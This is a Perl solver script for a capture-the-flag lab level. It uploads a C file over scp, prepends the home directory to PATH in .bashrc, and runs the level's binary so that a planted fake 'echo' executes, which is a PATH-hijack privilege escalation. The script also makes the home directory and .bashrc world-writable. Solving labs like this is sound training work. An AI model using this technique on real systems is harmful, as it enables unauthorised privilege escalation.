#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level03";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$scp = "scp -q -P 4242 ./echo.c $user\@$ip:~";
print $green, $scp, $reset, "\n";
system($scp);

$path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
$input = "echo $path > .bashrc && gcc echo.c -o echo && ./level03";
print $red, $input, $reset, "\n";
system("ssh -qp 4242 $user\@$ip 'chmod 777 . && chmod 777 .bashrc && $input'");
